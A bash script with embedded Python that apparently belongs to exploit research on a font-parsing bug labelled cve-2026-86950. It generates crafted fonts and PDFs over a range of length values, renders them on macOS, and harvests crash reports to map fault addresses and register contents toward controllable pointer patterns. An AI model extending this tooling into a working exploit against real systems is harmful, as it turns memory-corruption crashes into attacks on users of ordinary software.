#!/bin/bash
# RIP-7: pattern-map sweep — both crash bands, .ips register census per L.
# Goal: L -> (fault addr class, fault site read/write, canonical pattern candidates)
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render4 render4.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation || exit 9
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python - << 'PYB'
import sys; sys.path.insert(0, '.')
from gen_k2 import build_font
Ls = list(range(-27648, -17407, 512)) + list(range(28000, 32761, 512))
for L in Ls: build_font(f"k2_p{L}.ttf", L)
print("fonts built:", len(Ls))
PYB
for L in $(seq -27648 -512 -17408); do ./venv/bin/python gen_pdf.py k2_p${L}.pdf k2_p${L}.ttf; done
for L in $(seq 28000 512 32752); do ./venv/bin/python gen_pdf.py k2_p${L}.pdf k2_p${L}.ttf; done

IPSDIR="$HOME/Library/Logs/DiagnosticReports"
./venv/bin/python - << 'PYG'
import subprocess, os, glob, sys, re, json, time
Ls = list(range(-27648, -17407, 512)) + list(range(28000, 32761, 512))
IPS = os.path.expanduser("~/Library/Logs/DiagnosticReports")
out = open("patternmap.txt", "w")
csv = open("patternmap.csv", "w")
csv.write("L,rc,fault_addr,site,x2,x9,x11,x16,x27,x22\n")
def W(*a): print(*a); print(*a, file=out)
def xval(ts, i):
    try: return ts['x'][i]['value']
    except Exception: return 0
for L in Ls:
    before = set(glob.glob(IPS + "/render4*.ips"))
    r = subprocess.run(['./render4', f'k2_p{L}.pdf', 'p.png'], capture_output=True, timeout=120)
    time.sleep(1.0)
    new = [f for f in glob.glob(IPS + "/render4*.ips") if f not in before]
    fa = site = '-'; x2=x9=x11=x16=x27=x22 = 0
    if new:
        new.sort(key=os.path.getmtime)
        try:
            raw = json.loads(open(new[-1]).read().split('\n', 1)[1])
            codes = raw.get('exception', {}).get('rawCodes', [0, 0])
            fa = hex(codes[1]) if len(codes) > 1 else '-'
            ft = raw.get('faultingThread', 0)
            thr = raw.get('threads', [{}])[ft] if raw.get('threads') else {}
            frs = thr.get('frames', [])
            if frs: site = "+%s" % frs[0].get('symbolLocation', '?')
            ts = thr.get('threadState', {})
            x2, x9, x11, x16 = xval(ts,2), xval(ts,9), xval(ts,11), xval(ts,16)
            x27, x22 = xval(ts,27), xval(ts,22)
        except Exception as e:
            site = "err %s" % e
        os.rename(new[-1], f"ips_p{L}.ips")
    def cls(v):
        if v == 0: return '-'
        if v >= 0xff00000000000000: return 'NONCANON-FF'
        if 0x100000000 <= v <= 0x800000000000: return 'CANON-HEAP'
        return 'OTHER'
    W("L=%6d rc=%3d site=%-7s fa=%s cls=%s" % (L, r.returncode, site, fa, cls(int(fa,16) if fa not in ('-',) else 0)))
    W("   x2=%x x9=%x x11=%x x16=%x x22=%x x27=%x" % (x2,x9,x11,x16,x22,x27))
    csv.write("%d,%d,%s,%s,%x,%x,%x,%x,%x,%x\n" % (L, r.returncode, fa, site, x2,x9,x11,x16,x27,x22))
out.close(); csv.close()
print("PATTERN MAP DONE")
PYG

cd ../..
mkdir -p findings
cp detonation/cve-2026-86950/{patternmap.txt,patternmap.csv} findings/ 2>/dev/null
cp detonation/cve-2026-86950/ips_p*.ips findings/ 2>/dev/null
ls findings/ | wc -l
cat detonation/cve-2026-86950/patternmap.txt | head -70
